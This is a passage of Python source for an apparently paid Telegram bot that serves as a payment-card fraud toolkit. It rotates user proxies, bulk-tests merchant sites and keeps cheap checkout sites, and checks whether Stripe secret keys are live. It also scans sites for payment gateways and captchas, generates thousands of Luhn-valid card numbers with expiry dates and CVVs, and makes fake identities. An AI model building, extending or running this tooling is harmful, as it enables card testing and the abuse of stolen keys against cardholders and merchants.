        if not parsed: return await styled_reply(event, f"{PE} <b>{bs('No valid proxies')}</b>", emoji_ids=[CE["cross"]])
        parsed = parsed[:100-cc]
        tm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(parsed)}...</b>", emoji_ids=[CE["shield"]])
        added, failed = [], []
        for i in range(0, len(parsed), 10):
            batch = parsed[i:i+10]
            results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in batch], return_exceptions=True)
            for pd2, res in zip(batch, results):
                if isinstance(res, tuple) and res[0]: await add_proxy_db(event.sender_id, pd2); added.append(1)
                else: failed.append(1)
        await styled_edit(tm, f"{PE} <b>{bs('Done')}</b> ✅{len(added)} ❌{len(failed)} | {bs('Total')}: {cc+len(added)}/100", emoji_ids=[CE["fire"]])
    except Exception as e: await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.](proxy|myproxy)$'))
async def proxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b> <code>/addproxy</code>", emoji_ids=[CE["cross"]])
    text = f"{PE} <b>{bs('Proxies')}</b> ({len(proxies)}/100) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"; eid = [CE["fire"],CE["fire"]]
    for i, p in enumerate(proxies[:30], 1): text += f"<code>{i}.</code> {PE} <b>{p['ip']}:{p['port']}</b>\n"; eid.append(CE["link"])
    if len(proxies) > 30: text += f"\n<i>+{len(proxies)-30} more</i>"
    text += f"\n{PE} <code>/rmproxy index</code>"; eid.append(CE["trash"])
    await styled_reply(event, text, emoji_ids=eid)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmproxy\b'))
async def rmproxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    p = event.raw_text.split(maxsplit=1)
    if len(p) == 1: return await styled_reply(event, f"{PE} <code>/rmproxy index</code> or <code>all</code>", emoji_ids=[CE["warn"]])
    arg = p[1].strip().lower()
    if arg == 'all': c = await clear_all_proxies(event.sender_id); return await styled_reply(event, f"{PE} <b>{bs('Cleared')} {c}</b>", emoji_ids=[CE["check"]])
    try:
        idx = int(arg)-1
        if 0 <= idx < len(proxies):
            rm = await remove_proxy_by_index(event.sender_id, idx)
            await styled_reply(event, f"{PE} <b>{bs('Removed')} {rm['ip']}:{rm['port']}</b>", emoji_ids=[CE["check"]])
        else: await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    except: await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmproxyindex\b'))
async def rmproxyindex_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    idx_str = event.raw_text.split(maxsplit=1)[1].strip() if len(event.raw_text.split())>1 else ""
    if not idx_str: return await styled_reply(event, f"{PE} {bs('Usage')}: <code>/rmproxyindex 1,2,3</code>", emoji_ids=[CE["info"]])
    try: indices = [int(i.strip())-1 for i in idx_str.split(',')]
    except: return await styled_reply(event, f"{PE} {bs('Invalid indices.')}", emoji_ids=[CE["cross"]])
    px = await get_all_user_proxies(event.sender_id)
    if not px: return await styled_reply(event, f"{PE} {bs('No proxies.')}", emoji_ids=[CE["warn"]])
    removed, new = [], []
    for i, p in enumerate(px):
        if i in indices: removed.append(p)
        else: new.append(p)
    if not removed: return await styled_reply(event, f"{PE} {bs('No valid indices.')}", emoji_ids=[CE["cross"]])
    await proxies_col.delete_many({"user_id": event.sender_id})
    for p in new: await add_proxy_db(event.sender_id, p)
    await styled_reply(event, f"✅ {bs('Removed')} {len(removed)} {bs('proxies!')}", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]clearproxy$'))
async def clearproxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    cnt = await clear_all_proxies(event.sender_id)
    await styled_reply(event, f"✅ {bs('Cleared all')} {cnt} {bs('proxies!')}", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]getproxy$'))
async def getproxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    px = await get_all_user_proxies(event.sender_id)
    if not px: return await styled_reply(event, f"{PE} {bs('No proxies in your list.')}", emoji_ids=[CE["warn"]])
    fn = f"proxies_{event.sender_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    async with aiofiles.open(fn,'w') as f:
        for i,p in enumerate(px): await f.write(f"{i+1}. {p['ip']}:{p['port']}\n")
    await styled_reply(event, f"📋 {bs('Your Proxies')} ({len(px)}):", emoji_ids=[CE["info"]], file=fn)
    try: os.remove(fn)
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkproxy$'))
async def chkproxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    px = await get_all_user_proxies(event.sender_id)
    if not px: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(px)}...</b>", emoji_ids=[CE["shield"]])
    res = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in px], return_exceptions=True)
    w = sum(1 for r in res if isinstance(r, tuple) and r[0])
    await styled_edit(sm, f"{PE} <b>{bs('Proxy Check')}</b>\n✅ {bs('Working')}: {w}\n❌ {bs('Dead')}: {len(res)-w}", emoji_ids=[CE["shield"]])

# ─── Site commands (bot13 names) ────────────────────────────────────────
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addsites\b'))
async def addsites_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned":
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    try:
        sta = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm and rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp,'r',encoding='utf-8',errors='ignore') as f: sta = extract_urls_from_text(await f.read())
                finally:
                    try: os.remove(fp)
                    except: pass
            elif rm and rm.text: sta = extract_urls_from_text(rm.text)
        add_text = re.sub(r'^[/.]addsites\s*', '', event.raw_text, flags=re.I).strip()
        if add_text:
            for s in extract_urls_from_text(add_text):
                if s not in sta: sta.append(s)
        if not sta: return await styled_reply(event, f"""{PE} <b>{bs('Add Site')}</b> {PE}\n{PE} <code>/addsites site.com</code>\n{PE} <i>{bs('Or reply .txt with')} </i><code>/addsites</code>""", emoji_ids=[CE["fire"],CE["fire"],CE["info"],CE["link"]])
        existing = {normalize_site_url(s) for s in await get_user_sites(event.sender_id)}; new_sites, dup = [], []
        for s in sta:
            n = normalize_site_url(s)
            if n in existing: dup.append(n)
            elif n not in [normalize_site_url(x) for x in new_sites]: new_sites.append(n)
        if not new_sites: return await styled_reply(event, f"""{PE} <b>{bs('All sites already exist')}</b> {PE}\n{PE} <b>{bs('Duplicates')}:</b> <code>{len(dup)}</code>""", emoji_ids=[CE["warn"],CE["warn"],CE["info"]])
        uid = event.sender_id; PENDING_ADD_SITES[uid] = {"sites": new_sites, "exists": dup, "event": event}
        kb = [[pbtn(f"{bs('0-5 USD')}", f"addprice:5:{uid}"), pbtn(f"{bs('0-10 USD')}", f"addprice:10:{uid}")],
              [pbtn(f"{bs('0-20 USD')}", f"addprice:20:{uid}"), pbtn(f"{bs('0-40 USD')}", f"addprice:40:{uid}")]]
        await styled_reply(event, f"""{PE} <b>{bs('Select Price Range')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('New Sites')}:</b> <code>{len(new_sites)}</code>\n{PE} <b>{bs('Already Exist')}:</b> <code>{len(dup)}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <i>{bs('Only working sites within price range will be added')}</i>""", buttons=kb, emoji_ids=[CE["fire"],CE["fire"],CE["globe"],CE["warn"],CE["info"]])
    except Exception as e: await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

async def _process_add_sites(event, new_sites, already_exists, max_price):
    uid = event.sender_id; total = len(new_sites); tested = working = dead = added = 0
    proxies = await get_all_user_proxies(uid); sem = get_user_sem(uid, "site"); http = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
    last_ui = [0]
    async def update_ui():
        now = time.time()
        if now - last_ui[0] < 3.0: return
        last_ui[0] = now
        try: await styled_edit(sm, f"{PE} <b>{bs('Testing')}...</b> {tested}/{total} | ✅{working} ❌{dead}", emoji_ids=[CE["fire"]])
        except: pass
    async def worker(site):
        nonlocal tested, working, dead, added
        async with sem:
            try:
                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=http)
                tested += 1
                if res['status'] == 'alive':
                    working += 1; pv = 0; ps = res.get('price','-')
                    if ps and ps != '-':
                        try: pv = float(str(ps).replace('$','').strip())
                        except: pass
                    if pv <= max_price:
                        if await add_site_db(uid, site): added += 1
                else: dead += 1
                await update_ui()
            except: dead += 1; tested += 1
    for i in range(0, total, SITE_PER_USER_WORKERS):
        await asyncio.gather(*[asyncio.create_task(worker(s)) for s in new_sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
    try: await styled_edit(sm, f"""{PE} <b>{bs('Complete')}</b> {PE}\n{PE} <b>{bs('Working')}:</b> <code>{working}</code> | <b>{bs('Dead')}:</b> <code>{dead}</code> | <b>{bs('Added')} ($0-${max_price}):</b> <code>{added}</code>""", emoji_ids=[CE["fire"],CE["check"],CE["cross"],CE["chart"]])
    except: pass
    ACTIVE_ADD_PROCESSES.pop(uid, None); await cleanup_user_http_session(uid, "site"); cleanup_user_sem(uid)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def rm_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned":
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    rt = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.I).strip()
    if rt.lower() == 'all':
        ex = await get_user_sites(event.sender_id)
        if not ex: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
        c = 0
        for s in ex:
            if await remove_site_db(event.sender_id, s): c += 1
        return await styled_reply(event, f"{PE} <b>{bs('Removed')} {c} {bs('sites')}</b>", emoji_ids=[CE["check"]])
    if not rt: return await styled_reply(event, f"{PE} <code>/rm site.com</code> {bs('or')} <code>/rm all</code>", emoji_ids=[CE["info"]])
    to_rm = extract_urls_from_text(rt)
    if not to_rm: return await styled_reply(event, f"{PE} <b>{bs('No URLs')}</b>", emoji_ids=[CE["cross"]])
    ex = await get_user_sites(event.sender_id); removed = []
    for s in to_rm:
        n = normalize_site_url(s)
        for e in ex:
            if normalize_site_url(e) == n:
                if await remove_site_db(event.sender_id, e): removed.append(e)
                break
    await styled_reply(event, f"{PE} <b>{bs('Removed')}:</b> <code>{len(removed)}</code>", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]site$'))
async def site_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    sites = await get_user_sites(event.sender_id)
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
    uid = event.sender_id; PENDING_SITE_CHECK[uid] = {"sites": sites, "event": event}
    kb = [[pbtn(f"{bs('0-5 USD')}", f"siteprice:5:{uid}"), pbtn(f"{bs('0-10 USD')}", f"siteprice:10:{uid}")],
          [pbtn(f"{bs('0-20 USD')}", f"siteprice:20:{uid}"), pbtn(f"{bs('0-40 USD')}", f"siteprice:40:{uid}")]]
    await styled_reply(event, f"{PE} <b>{bs('Select Price Range')}</b> {PE}\n{PE} <b>{bs('Sites')}:</b> <code>{len(sites)}</code>\n{PE} <i>{bs('Dead + over-price will be removed')}</i>", buttons=kb, emoji_ids=[CE["fire"],CE["fire"],CE["globe"],CE["warn"]])

async def _process_site_check(event, sites, max_price):
    uid = event.sender_id; total = len(sites); tested = alive = dead = kept = removed_price = 0
    proxies = await get_all_user_proxies(uid); sem = get_user_sem(uid, "site"); http = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"{PE} <b>{bs('Checking')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
    last_ui = [0]; dead_set = set(); price_rm = set()
    async def update_ui():
        now = time.time()
        if now - last_ui[0] < 3.0: return
        last_ui[0] = now
        try: await styled_edit(sm, f"{PE} <b>{tested}/{total}</b> | ✅{alive} ❌{dead}", emoji_ids=[CE["fire"]])
        except: pass
    async def worker(site):
        nonlocal tested, alive, dead, kept, removed_price
        async with sem:
            try:
                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=http)
                tested += 1
                if res['status'] == 'alive':
                    alive += 1; pv = 0; ps = res.get('price','-')
                    if ps and ps != '-':
                        try: pv = float(str(ps).replace('$','').strip())
                        except: pass
                    if pv <= max_price: kept += 1
                    else: removed_price += 1; price_rm.add(normalize_site_url(site))
                else: dead += 1; dead_set.add(normalize_site_url(site))
                await update_ui()
            except: dead += 1; tested += 1; dead_set.add(normalize_site_url(site))
    for i in range(0, total, SITE_PER_USER_WORKERS):
        await asyncio.gather(*[asyncio.create_task(worker(s)) for s in sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
    for s in sites:
        n = normalize_site_url(s)
        if n in dead_set or n in price_rm: await remove_site_db(uid, s)
    try: await styled_edit(sm, f"""{PE} <b>{bs('Done')}</b> | ✅{alive} ❌{dead} | {bs('Kept')}:{kept} | {bs('Removed')}:{dead+removed_price}""", emoji_ids=[CE["fire"]])
    except: pass
    await cleanup_user_http_session(uid, "site"); cleanup_user_sem(uid)

@client.on(events.NewMessage(pattern='/getsites'))
async def getsites_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    sites = await get_user_sites(event.sender_id)
    if not sites: return await styled_reply(event, f"{PE} {bs('No sites')}", emoji_ids=[CE["warn"]])
    fn = f"sites_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    async with aiofiles.open(fn,'w') as f:
        for s in sites: await f.write(s+"\n")
    await styled_reply(event, f"📋 {bs('Sites')} ({len(sites)}):", emoji_ids=[CE["info"]], file=fn)
    try: os.remove(fn)
    except: pass

@client.on(events.NewMessage(pattern='/setthreshold'))
async def setthreshold_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        val = float(event.raw_text.split()[1])
        with open("threshold.txt","w") as f: f.write(str(val))
        await styled_reply(event, f"✅ {bs('Threshold set to')} ${val}", emoji_ids=[CE["check"]])
    except: await styled_reply(event, f"{PE} {bs('Usage')}: /setthreshold 20", emoji_ids=[CE["info"]])

@client.on(events.NewMessage(pattern='/getthreshold'))
async def getthreshold_cmd(event):
    try:
        with open("threshold.txt","r") as f: val = f.read().strip()
        await styled_reply(event, f"💰 {bs('Current threshold')}: ${val}", emoji_ids=[CE["info"]])
    except: await styled_reply(event, f"{PE} {bs('No threshold set.')}", emoji_ids=[CE["warn"]])

# ─── Tools (bot13 names) ────────────────────────────────────────────────
@client.on(events.NewMessage(pattern=r'/bin\s+'))
async def bin_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    try:
        bn = event.message.text.split()[1].strip()
        if not bn.isdigit() or len(bn) < 6: return await styled_reply(event, f"{PE} {bs('Please provide a valid BIN (6+ digits).')}", emoji_ids=[CE["warn"]])
        bi = await get_bin_info(bn)
        msg = pe(f"""{PE} {bs('BIN Lookup')}

📌 {bs('BIN')}: <code>{bn}</code>
🏷️ {bs('Brand')}: {bi.get('brand','-')}
💳 {bs('Type')}: {bi.get('type','-')}
📊 {bs('Level')}: {bi.get('level','-')}
🏦 {bs('Bank')}: {bi.get('bank','-')}
🌍 {bs('Country')}: {bi.get('country','-')} {bi.get('flag','🏳️')}""")
        await styled_reply(event, msg, emoji_ids=[CE["info"]])
    except IndexError: await styled_reply(event, f"📝 {bs('Usage')}: <code>/bin 123456</code>", emoji_ids=[CE["info"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'/sk\s+'))
async def sk_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    try:
        key = event.message.text.split()[1].strip()
        if not key.startswith(('sk_live_','sk_test_','rk_live_','rk_test_')): return await styled_reply(event, f"{PE} {bs('Invalid Stripe key format.')}", emoji_ids=[CE["warn"]])
        sess = await get_user_http_session(event.sender_id, "sp")
        async with sess.get('https://api.stripe.com/v1/account', headers={'Authorization': f'Bearer {key}'}) as resp:
            if resp.status == 200:
                d = await resp.json()
                msg = pe(f"""✅ {bs('Stripe Key is')} <b>VALID</b>

🔑 {bs('Key')}: <code>{key}</code>
🏦 {bs('Account')}: {d.get('business_name','N/A')}
🌍 {bs('Country')}: {d.get('country','N/A')}
📊 {bs('Charges Enabled')}: {d.get('charges_enabled', False)}""")
                await styled_reply(event, msg, emoji_ids=[CE["check"]])
            else: await styled_reply(event, f"❌ {bs('Stripe Key is')} <b>INVALID</b> (HTTP {resp.status})", emoji_ids=[CE["cross"]])
    except IndexError: await styled_reply(event, f"📝 {bs('Usage')}: <code>/sk sk_live_...</code>", emoji_ids=[CE["info"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'/scg\s+'))
async def scg_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    try:
        url = event.message.text.split()[1].strip()
        if not url.startswith('http'): url = 'https://'+url
        sess = await get_user_http_session(event.sender_id, "sp")
        async with sess.get(url, timeout=30) as resp:
            if resp.status != 200: return await styled_reply(event, f"❌ {bs('Failed to fetch site')} (HTTP {resp.status})", emoji_ids=[CE["cross"]])
            html = await resp.text()
        gw = []
        if 'js.stripe.com' in html or 'stripe.com' in html: gw.append('Stripe')
        if 'paypal.com' in html or 'paypalobjects.com' in html: gw.append('PayPal')
        if 'shopify.com' in html or 'cdn.shopify.com' in html: gw.append('Shopify')
        if 'braintree' in html: gw.append('Braintree')
        if 'woocommerce' in html: gw.append('WooCommerce')
        if 'authorize.net' in html: gw.append('Authorize.net')
        if 'square.com' in html or 'sqpaymentform' in html: gw.append('Square')
        if 'razorpay.com' in html: gw.append('Razorpay')
        if 'adyen.com' in html: gw.append('Adyen')
        if 'mollie.com' in html: gw.append('Mollie')
        if 'klarna.' in html: gw.append('Klarna')
        if 'afterpay' in html: gw.append('Afterpay')
        cms = []
        if '/wp-content/' in html or 'wp-json' in html: cms.append('WordPress')
        if 'woocommerce' in html: cms.append('WooCommerce')
        if 'myshopify.com' in html: cms.append('Shopify')
        if 'magento' in html: cms.append('Magento')
        if not cms: cms = ['Unknown']
        captcha = None
        if 'recaptcha' in html or 'g-recaptcha' in html: captcha = 'reCAPTCHA'
        elif 'hcaptcha' in html: captcha = 'hCaptcha'
        msg = pe(f"""{PE} {bs('Site Scanner Results')}

📌 {bs('URL')}: <code>{url}</code>

🛒 {bs('Gateways')}: {', '.join(gw) if gw else 'None'}
📰 {bs('CMS')}: {', '.join(cms)}
🔒 {bs('Captcha')}: {captcha or 'None'}""")
        await styled_reply(event, msg, emoji_ids=[CE["info"]])
    except IndexError: await styled_reply(event, f"📝 {bs('Usage')}: <code>/scg https://example.com</code>", emoji_ids=[CE["info"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

# /gen, /fake, /ip, /iban (same as before, keep concise)
def luhn_checksum(card_number):
    def digits_of(n): return [int(d) for d in str(n)]
    digits = digits_of(card_number); odd = digits[-1::-2]; even = digits[-2::-2]
    checksum = sum(odd)
    for d in even: checksum += sum(digits_of(d*2))
    return checksum % 10
def generate_card_number(bin_prefix, length=16):
    card = bin_prefix
    while len(card) < length-1: card += str(random.randint(0,9))
    check = (10 - luhn_checksum(card+'0')) % 10
    return card + str(check)

@client.on(events.NewMessage(pattern=r'/gen\s+'))
async def gen_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    try:
        parts = event.message.text.split(); bn = parts[1].strip()
        if not bn.isdigit() or len(bn) < 6: return await styled_reply(event, f"{PE} {bs('Please provide a valid BIN (6+ digits).')}", emoji_ids=[CE["warn"]])
        cnt = int(parts[2]) if len(parts) > 2 else 5
        if cnt > 5000: cnt = 5000
        cards = []
        for _ in range(cnt):
            num = generate_card_number(bn); mm = str(random.randint(1,12)).zfill(2); yy = str(random.randint(2026,2035)); cvv = str(random.randint(100,999)).zfill(3)
            cards.append(f"{num}|{mm}|{yy}|{cvv}")
        if cnt > 50:
            fn = f"gen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            async with aiofiles.open(fn,'w') as f:
                await f.write("GENERATED CARDS\n"+"="*30+"\n\n")
                for c in cards: await f.write(c+"\n")
            await styled_reply(event, f"✅ {bs('Generated')} {len(cards)} {bs('cards for BIN')} {bn}:", emoji_ids=[CE["check"]], file=fn)
            try: os.remove(fn)
            except: pass
        else:
            txt = "\n".join(f"<code>{c}</code>" for c in cards)
            await styled_reply(event, f"✅ {bs('Generated')} {len(cards)} {bs('cards for BIN')} {bn}:\n\n{txt}", emoji_ids=[CE["check"]])
    except IndexError: await styled_reply(event, f"📝 {bs('Usage')}: <code>/gen 123456 [count]</code>", emoji_ids=[CE["info"]])
    except ValueError: await styled_reply(event, f"{PE} {bs('Count must be a number.')}", emoji_ids=[CE["cross"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

FAKE_DATA = {
    'US': {'first':['John','Jane','Michael','Sarah','David','Emma','James','Olivia'],'last':['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis'],'city':['New York','Los Angeles','Chicago','Houston','Phoenix','Philadelphia','San Antonio','San Diego'],'street':['Main St','Oak Ave','Pine Rd','Maple Dr','Cedar Ln','Elm St','Washington Ave','Lake St'],'zip':['10001','90001','60601','77001','85001','19101','78201','92101'],'state':['NY','CA','IL','TX','AZ','PA','TX','CA']},
    'GB': {'first':['Oliver','George','Harry','Jack','Jacob','Charlie','Thomas','William'],'last':['Smith','Jones','Williams','Taylor','Brown','Davies','Evans','Wilson'],'city':['London','Birmingham','Leeds','Glasgow','Sheffield','Manchester','Edinburgh','Liverpool'],'street':['High St','Church St','Queen St','King St','Park Ave','Victoria Rd','Station Rd','Main St'],'zip':['SW1A 1AA','B1 1AA','LS1 1AA','G1 1AA','S1 1AA','M1 1AA','EH1 1AA','L1 1AA'],'state':['England','Scotland','Wales','Northern Ireland']},
    'CA': {'first':['Liam','Noah','Oliver','Elijah','William','James','Benjamin','Lucas'],'last':['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis'],'city':['Toronto','Vancouver','Montreal','Calgary','Edmonton','Ottawa','Winnipeg','Quebec'],'street':['Main St','Queen St','King St','Bay St','Yonge St','Granville St','St-Catherine St','Portage Ave'],'zip':['M5V 2H1','V6Z 2E6','H2Y 1J1','T2P 2M5','T5J 2N4','K1P 1C1','R3B 1A1','G1R 1A1'],'state':['ON','BC','QC','AB','MB','SK','NS','NB']}
}
@client.on(events.NewMessage(pattern=r'/fake\s+'))
async def fake_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    try:
        cc = event.message.text.split()[1].strip().upper()
        if cc not in FAKE_DATA: return await styled_reply(event, f"{PE} {bs('Country not supported. Available: US, GB, CA.')}", emoji_ids=[CE["warn"]])
        d = FAKE_DATA[cc]; f = random.choice(d['first']); l = random.choice(d['last']); city = random.choice(d['city']); st = random.choice(d['street']); zp = random.choice(d['zip']); state = random.choice(d['state'])
        phone = f"+1{random.randint(2000000000,9999999999)}" if cc=='US' else f"+44{random.randint(7000000000,7999999999)}"
        email = f"{f.lower()}.{l.lower()}@example.com"
        msg = pe(f"""🌍 {bs('Fake Data')} ({cc})

👤 {bs('Name')}: {f} {l}
📧 {bs('Email')}: {email}
📞 {bs('Phone')}: {phone}
🏠 {bs('Address')}: {st}, {city}, {state} {zp}
🌐 {bs('Country')}: {cc}""")
        await styled_reply(event, msg, emoji_ids=[CE["info"]])
    except IndexError: await styled_reply(event, f"📝 {bs('Usage')}: <code>/fake US</code>", emoji_ids=[CE["info"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'/ip\s+'))
async def ip_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    try:
        ip = event.message.text.split()[1].strip()
        sess = await get_user_http_session(event.sender_id, "sp")
        async with sess.get(f'http://ip-api.com/json/{ip}') as resp:
            if resp.status != 200: return await styled_reply(event, f"{PE} {bs('Failed to fetch IP info.')}", emoji_ids=[CE["cross"]])
            d = await resp.json()
            if d.get('status') == 'fail': return await styled_reply(event, f"{PE} {bs('Invalid IP address.')}", emoji_ids=[CE["cross"]])
            flag = d.get('countryCode','')
            msg = pe(f"""🌐 {bs('IP Lookup')}

📌 {bs('IP')}: <code>{ip}</code>
🌍 {bs('Country')}: {d.get('country','N/A')} {flag}
🏙️ {bs('City')}: {d.get('city','N/A')}
📍 {bs('Region')}: {d.get('regionName','N/A')}
📮 {bs('ZIP')}: {d.get('zip','N/A')}
📊 {bs('ISP')}: {d.get('isp','N/A')}""")
            await styled_reply(event, msg, emoji_ids=[CE["info"]])
    except IndexError: await styled_reply(event, f"📝 {bs('Usage')}: <code>/ip 8.8.8.8</code>", emoji_ids=[CE["info"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

def iban_validator(iban):
    iban = iban.replace(' ','').upper()
    if not re.match(r'^[A-Z]{2}\d{2}[A-Z0-9]{1,30}$', iban): return False
    rearr = iban[4:]+iban[:4]; num = ''
    for ch in rearr:
        if ch.isdigit(): num += ch
        else: num += str(ord(ch)-55)
    return int(num)%97 == 1
